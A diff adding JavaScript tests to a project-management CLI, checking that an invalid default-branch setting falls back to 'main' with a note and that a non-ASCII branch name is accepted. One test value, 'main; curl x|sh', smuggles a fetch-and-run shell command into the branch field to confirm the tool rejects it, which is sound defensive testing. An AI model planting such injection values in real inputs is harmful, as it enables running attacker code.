@@ -613,3 +613,43 @@ test('pr blockers with git_host.system none is NOT_SUPPORTED', async () => {
   assert.equal(result.code, 2)
   assert.equal(errorOf(result).code, 'NOT_SUPPORTED')
 })
+
+const BAD_BRANCH = 'main; curl x|sh'
+const NOTE = 'note: git_host.default_branch is not a valid branch name, so main is used'
+function badBranchRepo() {
+  const root = teamRepo()
+  const file = path.join(root, '.pmkit/config.yaml')
+  fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace('default_branch: main', `default_branch: "${BAD_BRANCH}"`))
+  return root
+}
+
+test('an invalid git_host.default_branch becomes main with a note in issues branch, pr open and pr diff', async () => {
+  const root = badBranchRepo()
+  git(root, '-c', 'user.name=t', '-c', 'user.email=t@x.dev', 'commit', '--allow-empty', '-qm', 'init')
+  const env = envWith(fakeGh({ [view('feat')]: NO_PR }))
+  const branch = await call(root, env, ['issues', 'branch', 'ISS-2X6D', '--dry-run', '--json'])
+  assert.equal(JSON.parse(branch.stdout).from, 'main')
+  assert.ok(branch.stderr.includes(NOTE), branch.stderr)
+  await callJson(root, env, ['issues', 'update', 'ISS-2X6D', '--branch', 'feat'])
+  const open = await call(root, env, ['pr', 'open', '--issue', 'ISS-2X6D', '--dry-run', '--json'])
+  assert.equal(JSON.parse(open.stdout).base, 'main')
+  assert.ok(open.stderr.includes(NOTE), open.stderr)
+  git(root, 'branch', '-M', 'main')
+  git(root, 'switch', '-qc', 'feat')
+  fs.writeFileSync(path.join(root, 'a.txt'), 'one\n')
+  git(root, 'add', 'a.txt')
+  git(root, '-c', 'user.name=t', '-c', 'user.email=t@x.dev', 'commit', '-qm', 'a')
+  const diff = await call(root, env, ['pr', 'diff', '--json'])
+  assert.equal(JSON.parse(diff.stdout).base, 'main')
+  assert.ok(diff.stderr.includes(NOTE), diff.stderr)
+})
+
+test('a branch with letters outside ASCII is a valid git_host.default_branch', async () => {
+  const root = teamRepo()
+  const file = path.join(root, '.pmkit/config.yaml')
+  fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace('default_branch: main', 'default_branch: développement'))
+  git(root, '-c', 'user.name=t', '-c', 'user.email=t@x.dev', 'commit', '--allow-empty', '-qm', 'init')
+  const result = await call(root, envWith(fakeGh({})), ['issues', 'branch', 'ISS-2X6D', '--dry-run', '--json'])
+  assert.equal(JSON.parse(result.stdout).from, 'développement')
+  assert.ok(!result.stderr.includes('not a valid branch name'), result.stderr)
+})
